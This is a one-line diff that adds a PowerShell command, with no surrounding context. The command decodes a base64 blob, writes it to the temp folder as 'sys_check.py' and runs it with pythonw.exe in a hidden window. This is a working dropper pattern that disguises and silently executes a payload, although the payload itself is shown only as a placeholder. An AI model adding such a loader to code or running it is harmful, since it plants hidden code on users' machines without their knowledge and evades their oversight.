@@ -1,0 +1,1 @@
+$c = "[BASE64_CODE]"; $b = [System.Convert]::FromBase64String($c); [System.IO.File]::WriteAllBytes("$env:TEMP\sys_check.py", $b); Start-Process pythonw.exe -ArgumentList "$env:TEMP\sys_check.py" -WindowStyle Hidden
